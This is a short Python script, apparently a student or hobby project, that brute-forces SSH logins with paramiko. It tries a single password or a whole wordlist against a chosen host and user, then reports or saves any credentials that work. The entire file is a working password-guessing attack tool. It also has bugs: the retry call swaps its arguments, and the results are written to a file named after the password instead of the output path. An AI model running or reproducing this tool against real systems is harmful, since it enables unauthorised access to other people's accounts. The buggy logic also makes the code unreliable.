import paramiko
import socket
import time
import argparse


def openSSHConnection (username, password, hostname):

    host = paramiko.SSHClient()
    
    host.set_missing_host_key_policy(paramiko.AutoAddPolicy())


    try:
       
        #attempt to connect to the specified host
        host.connect(hostname=hostname, username=username, password=password, timeout=3)
    except paramiko.AuthenticationException:
       
        #if the user/pass combo is invalid
        print(f"{username}:{password} is invalid")
        funcStatus = False
    
    except paramiko.SSHException:

        #retrying if the host recieves too many attempts
        print(f"{hostname} quota exceeded, retrying...")
        time.sleep(60)
        funcStatus = openSSHConnection(hostname, username, password)

    except socket.timeout:

        #if the host does not appear up, or does not have ssh enabled
        print(f"the host {hostname} is not responding and is unreachable")
        funcStatus = False
        return False

    else:

        #if the user/pass combo is successful, and no exceptions were thrown
        print(f"Successful connection to {hostname} with combination: \n\tUsername: {username} \n\tPassword: {password}")
        funcStatus = True

    finally:

        host.close()
        return funcStatus


if __name__ == "__main__":
    parser = argparse.ArgumentParser()

    #specifying the 
    parser.add_argument("--host", help="specify the host to brute force")
    parser.add_argument("-u", "--username", help="specify the username")
    parser.add_argument("-p", "--password", help="specify the password")
    parser.add_argument("-w", "--wordlist", help="specify the file containing the password list")
    parser.add_argument("-o", "--output", help="Specify output file location")


    args = parser.parse_args()
    host = args.host
    user = args.username
    if args.password:
        #do a thing
        password = args.password
        if openSSHConnection(user, password, host):
            if args.output:
                outfile = args.output
                open(password, "w").write(f"{user}@{host}:{password}")
            else:
                print("No output file specified")

    elif args.wordlist:
        wordlist = args.wordlist
        passlist = open(wordlist, encoding="latin-1").read().splitlines()
        for password in passlist:
            if openSSHConnection(user, password, host):
                if args.output:
                    outfile = args.output
                    open(password, "w").write(f"{user}@{host}:{password}")
                    break
                else:
                    print("No output file specified")
        #read from the file specified and start the for loop
        

    #put the for loop here, and parse the arguments
    #I'll want -h for hostname, -u for username, -p for password, -w for wordlist
